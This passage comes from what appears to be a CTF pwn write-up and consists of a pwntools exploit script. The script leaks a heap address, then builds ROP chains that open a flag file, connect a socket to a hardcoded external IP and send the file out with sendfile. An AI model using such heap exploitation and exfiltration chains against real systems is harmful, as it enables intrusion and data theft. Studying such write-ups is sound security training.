</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="s1">&#39;signed&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">flat</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">        <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_r12_rbp_ret</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="n">p32</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="s1">&#39;signed&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">		<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="n">p64</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="mh">0x3d</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="n">p64</span><span class="p">(</span><span class="n">magic_gadget</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Data: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">heap_addr</span><span class="o">=</span><span class="n">u32</span><span class="p">(</span><span class="n">rn</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x4</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span><span class="o">&lt;&lt;</span><span class="mi">12</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;heap_addr&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span> <span class="c1">#1</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span> <span class="c1">#2</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span> <span class="c1">#3</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span> <span class="c1">#4</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">()</span> <span class="c1">#5</span>
</span></span><span class="line"><span class="cl"><span class="n">chunk1_addr</span><span class="o">=</span><span class="n">heap_addr</span><span class="o">+</span><span class="mh">0x1100</span>
</span></span><span class="line"><span class="cl"><span class="n">chunk2_addr</span><span class="o">=</span><span class="n">heap_addr</span><span class="o">+</span><span class="mh">0x1330</span>
</span></span><span class="line"><span class="cl"><span class="n">chunk3_addr</span><span class="o">=</span><span class="n">heap_addr</span><span class="o">+</span><span class="mh">0x1560</span>
</span></span><span class="line"><span class="cl"><span class="n">chunk4_addr</span><span class="o">=</span><span class="n">heap_addr</span><span class="o">+</span><span class="mh">0x1790</span>
</span></span><span class="line"><span class="cl"><span class="n">chunk5_addr</span><span class="o">=</span><span class="n">heap_addr</span><span class="o">+</span><span class="mh">0x19c0</span>
</span></span><span class="line"><span class="cl"><span class="n">sock_addr</span><span class="o">=</span><span class="n">chunk1_addr</span><span class="o">+</span><span class="mh">0x1d0</span>
</span></span><span class="line"><span class="cl"><span class="n">bss</span><span class="o">=</span><span class="mh">0x4061D0</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsp</span><span class="o">=</span><span class="mh">0x000000000040284e</span> <span class="c1">#0x0000000000402577 : pop rsp ; pop r13 ; pop rbp ; ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span><span class="o">=</span><span class="mh">0x0000000000027765</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span><span class="o">=</span><span class="mh">0x0000000000028f19</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx</span><span class="o">=</span><span class="mh">0x00000000000fdcfd</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_rcx_rbx</span><span class="o">=</span><span class="mh">0x00000000000edc7f</span> <span class="c1">#: pop rdx ; pop rcx ; pop rbx ; ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_rbp</span><span class="o">=</span><span class="mh">0x004030ea</span><span class="c1">#: pop rbp; ret;</span>
</span></span><span class="line"><span class="cl"><span class="n">mov_rax</span><span class="o">=</span><span class="mh">0x00000000004030e2</span><span class="c1"># :# mov rax, qword ptr [rbp - 8] ; mov rax, qword ptr [rax + 0x10] ; pop rbp ; ret </span>
</span></span><span class="line"><span class="cl"><span class="n">jmp_rax</span><span class="o">=</span><span class="mh">0x00402dbe</span><span class="c1"># jmp rax;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_addr</span><span class="o">=</span><span class="n">heap_addr</span><span class="o">+</span><span class="mh">0x1100</span><span class="o">+</span><span class="mh">0x30</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stdout_addr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x2d</span><span class="o">-</span><span class="mh">0x28</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4061A0</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stdout_addr</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;flag</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stdout_addr</span><span class="o">+</span><span class="mh">0x3d</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span><span class="n">flat</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">    <span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span> <span class="n">pop_rdi</span><span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stderr_&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="o">-</span> <span class="n">pop_rdi</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span> <span class="n">pop_rdx</span><span class="o">-</span><span class="mh">0x111111</span><span class="o">-</span><span class="n">pop_rsi</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span> <span class="mh">0x111111</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">modify</span><span class="p">(</span><span class="n">stdout_addr</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;open&#39;</span><span class="p">]</span><span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rsp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">chunk2_addr</span><span class="o">-</span><span class="mh">0x8</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span>	
</span></span><span class="line"><span class="cl"><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x1d0</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_func</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_func1</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x1d0</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xa2217c70b8220002</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="c1">#socket struct</span>
</span></span><span class="line"><span class="cl"><span class="n">payload1</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x30</span><span class="o">+</span><span class="n">flat</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">    <span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span> <span class="n">pop_rdi</span><span class="o">-</span><span class="n">pop_rdx</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="o">-</span> <span class="n">pop_rdi</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span> <span class="n">pop_rdx</span><span class="o">-</span><span class="mh">0x111111</span><span class="o">-</span><span class="n">pop_rsi</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span><span class="mh">0x111111</span><span class="p">),</span>	
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">modify</span><span class="p">(</span><span class="n">stdout_addr</span><span class="p">,</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;socket&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;open&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rsp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">chunk3_addr</span><span class="o">-</span><span class="mh">0x8</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span>	
</span></span><span class="line"><span class="cl"><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_func</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload2</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x30</span><span class="o">+</span><span class="n">flat</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">    <span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span> <span class="n">pop_rdi</span><span class="o">-</span><span class="n">pop_rdx</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="o">-</span> <span class="n">pop_rdi</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">sock_addr</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span> <span class="n">pop_rdx</span><span class="o">-</span><span class="mh">0x111111</span><span class="o">-</span><span class="n">pop_rsi</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span><span class="mh">0x111111</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">16</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">modify</span><span class="p">(</span><span class="n">stdout_addr</span><span class="p">,</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;connect&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;socket&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rsp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">chunk4_addr</span><span class="o">-</span><span class="mh">0x8</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span>	
</span></span><span class="line"><span class="cl"><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_func</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload3</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x30</span><span class="o">+</span><span class="n">flat</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">    <span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span> <span class="n">pop_rdi</span><span class="o">-</span><span class="n">pop_rdx</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span> <span class="n">pop_rsi</span><span class="o">-</span> <span class="n">pop_rdi</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span> <span class="n">pop_rdx_rcx_rbx</span><span class="o">-</span><span class="mh">0x111111</span><span class="o">-</span><span class="n">pop_rsi</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">modify</span><span class="p">(</span><span class="n">stderr_addr</span><span class="p">,</span><span class="mh">0x111111</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">-</span><span class="mh">0x18</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">modify</span><span class="p">(</span><span class="n">stdout_addr</span><span class="p">,</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;sendfile&#39;</span><span class="p">]</span> <span class="o">-</span><span class="mh">0x111111</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;connect&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">    <span class="n">modify</span><span class="p">(</span><span class="n">stdout_addr</span><span class="p">,</span><span class="mh">0x111111</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">pop_rbp</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">	<span class="n">p64</span><span class="p">(</span><span class="n">jmp_rax</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_func</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="n">payload3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;heap_addr&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#mydbg()</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x1f0</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x220</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_addr</span><span class="o">+</span><span class="mh">0x1100</span><span class="o">+</span><span class="mh">0x38</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0402395</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 class="heading-element" id="思路二"><span>思路二</span>
  <a href="#%e6%80%9d%e8%b7%af%e4%ba%8c" class="heading-mark">
